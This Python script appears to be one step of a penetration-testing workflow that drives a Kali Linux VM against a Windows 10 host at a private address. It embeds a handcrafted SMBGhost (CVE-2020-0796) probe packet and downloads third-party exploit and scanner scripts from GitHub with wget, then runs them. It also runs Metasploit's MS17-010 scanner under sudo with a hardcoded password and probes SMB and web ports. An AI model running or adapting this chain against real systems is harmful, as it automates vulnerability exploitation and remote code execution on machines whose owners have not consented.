#!/usr/bin/env python3
"""Step 8: SMBGhost (CVE-2020-0796) RCE exploit
Target: Windows 10 Build 19041 (2004) - potentially vulnerable
"""
import subprocess
import os

VMRUN = r'D:\software\vmware\tool\vmrun.exe'
VMX = r'E:\BaiduNetdiskDownload\kali-linux-2026.1-vmware-amd64.vmwarevm\kali-linux-2026.1-vmware-amd64.vmx'
TEMP = os.environ.get('TEMP', r'C:\Users\xianyv\AppData\Local\Temp')

def run_kali(cmd, timeout=120):
    script_path = os.path.join(TEMP, 'kali_cmd.sh')
    with open(script_path, 'w', encoding='utf-8', newline='\n') as f:
        f.write(f'#!/bin/bash\n{cmd}\n')
    subprocess.run([VMRUN, '-T', 'ws', '-gu', 'kali', '-gp', 'kali',
                    'copyFileFromHostToGuest', VMX,
                    script_path, '/tmp/kali_cmd.sh'],
                   capture_output=True, text=True, timeout=30)
    subprocess.run([VMRUN, '-T', 'ws', '-gu', 'kali', '-gp', 'kali',
                    'runProgramInGuest', VMX,
                    '/bin/bash', '-c',
                    f'chmod +x /tmp/kali_cmd.sh && timeout {timeout} /tmp/kali_cmd.sh > /tmp/kali_out.txt 2>&1'],
                   capture_output=True, text=True, timeout=timeout + 30)
    out_path = os.path.join(TEMP, 'kali_out.txt')
    subprocess.run([VMRUN, '-T', 'ws', '-gu', 'kali', '-gp', 'kali',
                    'copyFileFromGuestToHost', VMX,
                    '/tmp/kali_out.txt', out_path],
                   capture_output=True, text=True, timeout=30)
    try:
        with open(out_path, 'r', encoding='utf-8', errors='ignore') as f:
            return f.read()
    except:
        return "[READ ERROR]"

# 1. SMBGhost detection script
print("=" * 60)
print("[1] SMBGhost (CVE-2020-0796) vulnerability detection")
print("=" * 60)

smbghost_check = '''#!/usr/bin/env python3
"""CVE-2020-0796 SMBGhost detection"""
import socket
import struct

target = '192.168.233.129'

def check_smbghost(target):
    """Check if target is vulnerable to CVE-2020-0796"""
    print(f"[*] Checking {target} for CVE-2020-0796 (SMBGhost)")
    
    # SMB3.1.1 Negotiate with compression
    pkt = bytearray()
    # NetBIOS
    pkt += b'\\x00\\x00\\x01\\x28'
    # SMB2 Header
    pkt += b'\\xfeSMB'
    pkt += b'\\x40\\x00'  # StructureSize
    pkt += b'\\x00\\x00'  # CreditCharge
    pkt += b'\\x00\\x00\\x00\\x00'  # Status
    pkt += b'\\x01\\x00'  # Command: Negotiate
    pkt += b'\\x1f\\x00'  # CreditRequest
    pkt += b'\\x00\\x00\\x00\\x00'  # Flags
    pkt += b'\\x00\\x00\\x00\\x00'  # NextCommand
    pkt += b'\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00'  # MessageId
    pkt += b'\\x00\\x00\\x00\\x00'  # Reserved
    pkt += b'\\x00\\x00\\x00\\x00'  # TreeId
    pkt += b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'  # SessionId
    pkt += b'\\x00' * 16  # Signature
    
    # Negotiate Request body with compression
    pkt += b'\\x24\\x00'  # StructureSize
    pkt += b'\\x05\\x00'  # DialectCount
    pkt += b'\\x01\\x00'  # SecurityMode
    pkt += b'\\x00\\x00'  # Reserved
    pkt += b'\\x7f\\x00\\x00\\x00'  # Capabilities (all)
    pkt += b'\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff'  # ClientGuid
    pkt += b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'  # NegotiateContextOffset (placeholder)
    pkt += b'\\x02\\x00'  # NegotiateContextCount
    pkt += b'\\x00\\x00'  # Reserved2
    # Dialects
    pkt += b'\\x02\\x02'  # 2.0.2
    pkt += b'\\x10\\x02'  # 2.1
    pkt += b'\\x00\\x03'  # 3.0
    pkt += b'\\x02\\x03'  # 3.0.2
    pkt += b'\\x11\\x03'  # 3.1.1
    
    # Padding
    pkt += b'\\x00' * 8
    
    # Negotiate Context: SMB2_COMPRESSION_CAPABILITIES
    pkt += b'\\x03\\x00'  # Type: SMB2_COMPRESSION_CAPABILITIES (0x0003)
    pkt += b'\\x0c\\x00'  # DataLength
    pkt += b'\\x00\\x00\\x00\\x00'  # Reserved
    pkt += b'\\x03\\x00'  # CompressionAlgorithmCount
    pkt += b'\\x00\\x00'  # Padding
    pkt += b'\\x01\\x00'  # Flags (SMB2_COMPRESSION_CAPABILITIES_FLAG_CHAINED)
    pkt += b'\\x00\\x00'  # Reserved
    # Algorithms
    pkt += b'\\x01\\x00'  # LZNT1
    pkt += b'\\x02\\x00'  # LZ77
    pkt += b'\\x03\\x00'  # LZ77+Huffman (RDP8)
    
    # Negotiate Context: SMB2_NETNAME_NEGOTIATE_CONTEXT_ID
    pkt += b'\\x05\\x00'  # Type: SMB2_NETNAME_NEGOTIATE_CONTEXT_ID
    pkt += b'\\x04\\x00'  # DataLength
    pkt += b'\\x00\\x00\\x00\\x00'  # Reserved
    pkt += b'\\x00\\x00\\x00\\x00'  # Server name hash
    
    s = socket.socket()
    s.settimeout(10)
    try:
        s.connect((target, 445))
        s.send(bytes(pkt))
        resp = s.recv(4096)
        
        print(f"[*] Response length: {len(resp)} bytes")
        
        if len(resp) < 68:
            print("[-] Response too short")
            return False
        
        # Parse negotiate response
        dialect = struct.unpack('<H', resp[68:70])[0]
        print(f"[*] Selected dialect: {dialect:#06x}")
        
        if dialect != 0x0311:
            print("[-] SMB3.1.1 not selected - not vulnerable")
            return False
        
        # Check negotiate context list
        if len(resp) > 72:
            ctx_offset = struct.unpack('<I', resp[72:76])[0]
            ctx_count = struct.unpack('<H', resp[76:78])[0]
            print(f"[*] Context offset: {ctx_offset}, count: {ctx_count}")
        
        # Search for compression context in response
        resp_hex = resp.hex()
        if '0300' in resp_hex[140:200]:
            print("[!] COMPRESSION CONTEXT FOUND in response!")
            print("[!] Server supports SMB compression - VULNERABLE to CVE-2020-0796!")
            
            # Extract compression algorithms
            for i in range(len(resp) - 4):
                if resp[i:i+2] == b'\\x03\\x00' and resp[i+2:i+4] == b'\\x0c\\x00':
                    print(f"[+] Compression context at offset {i}")
                    if i + 16 < len(resp):
                        algo_count = struct.unpack('<H', resp[i+8:i+10])[0]
                        flags = struct.unpack('<H', resp[i+10:i+12])[0]
                        print(f"[+] Algorithm count: {algo_count}")
                        print(f"[+] Flags: {flags:#06x}")
                        for j in range(algo_count):
                            if i + 12 + j*2 < len(resp):
                                algo = struct.unpack('<H', resp[i+12+j*2:i+14+j*2])[0]
                                algos = {1: 'LZNT1', 2: 'LZ77', 3: 'LZ77+Huffman', 4: 'Pattern_V1'}
                                print(f"[+] Algorithm {j+1}: {algo} ({algos.get(algo, 'Unknown')})")
                    break
            
            print()
            print("[!!!] TARGET IS VULNERABLE TO SMBGhost (CVE-2020-0796)!")
            print("[!!!] RCE exploit can be used!")
            return True
        else:
            print("[-] No compression context in response - not vulnerable")
            return False
        
        s.close()
    except Exception as e:
        print(f"[-] Error: {e}")
        return False

check_smbghost(target)
'''

# Write and run detection script
script_path = os.path.join(TEMP, 'smbghost_check.py')
with open(script_path, 'w', encoding='utf-8') as f:
    f.write(smbghost_check)

subprocess.run([VMRUN, '-T', 'ws', '-gu', 'kali', '-gp', 'kali',
                'copyFileFromHostToGuest', VMX,
                script_path, '/tmp/smbghost_check.py'],
               capture_output=True, text=True, timeout=30)

out = run_kali("python3 /tmp/smbghost_check.py", timeout=30)
print(out)

# 2. Download SMBGhost exploit
print("\n" + "=" * 60)
print("[2] Download SMBGhost exploit")
print("=" * 60)
out = run_kali(
    "cd /tmp && "
    "pip3 install mypy 2>/dev/null; "
    "wget -q https://raw.githubusercontent.com/danigargu/CVE-2020-0796/master/smbghost_scanner.py -O smbghost_scan.py 2>&1 && "
    "python3 smbghost_scan.py -t 192.168.233.129 -c check 2>&1 || "
    "echo 'Scanner download failed, trying alternative...' && "
    "wget -q https://raw.githubusercontent.com/Barriuso/SMBGhost_Automate/refs/heads/main/SMBGhost_Automate.py -O /tmp/smbghost_auto.py 2>&1 && "
    "echo 'Downloaded SMBGhost_Automate'",
    timeout=60
)
print(out)

# 3. Try SMBGhost RCE
print("\n" + "=" * 60)
print("[3] SMBGhost RCE exploit")
print("=" * 60)
out = run_kali(
    "cd /tmp && "
    "wget -q https://raw.githubusercontent.com/danigargu/CVE-2020-0796/master/smbghost_scanner.py -O sg_scan.py 2>&1 && "
    "python3 sg_scan.py -t 192.168.233.129 2>&1",
    timeout=60
)
print(out)

# 4. Try MSF MS17-010 with fixed bootsnap
print("\n" + "=" * 60)
print("[4] MSF with bootsnap fix - MS17-010 scanner")
print("=" * 60)
out = run_kali(
    "echo kali | sudo -S bash -c 'export DISABLE_BOOTSNAP=1; "
    "rm -rf /usr/lib/llvm-18/build/Debug+Asserts/build 2>/dev/null; "
    "msfconsole -q -x \"use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS 192.168.233.129; run; exit\"' 2>&1 | tail -20",
    timeout=180
)
print(out)

# 5. Try anonymous SMB2 session
print("\n" + "=" * 60)
print("[5] Anonymous SMB2 tree connect")
print("=" * 60)
out = run_kali(
    "python3 -c '"
    "from impacket.smbconnection import SMBConnection;"
    "try:"
    "  c = SMBConnection(\"192.168.233.129\", \"192.168.233.129\");"
    "  print(\"Connected!\");"
    "  print(\"ServerOS:\", c.getServerOS());"
    "  print(\"ServerName:\", c.getServerName());"
    "  print(\"ServerDomain:\", c.getServerDomain());"
    "  print(\"ServerBuild:\", c.getServerOSBuild());"
    "  c.logoff();"
    "except Exception as e:"
    "  print(\"Error:\", e);"
    "' 2>&1",
    timeout=30
)
print(out)

# 6. Check for web services on other ports
print("\n" + "=" * 60)
print("[6] Check ports 5040 and 7680 for web services")
print("=" * 60)
out = run_kali(
    "curl -s -m 5 http://192.168.233.129:5040/ 2>&1 | head -20; "
    "echo '---'; "
    "curl -s -m 5 http://192.168.233.129:7680/ 2>&1 | head -20",
    timeout=30
)
print(out)

print("\n" + "=" * 60)
print("SMBGHOST PHASE COMPLETE")
print("=" * 60)
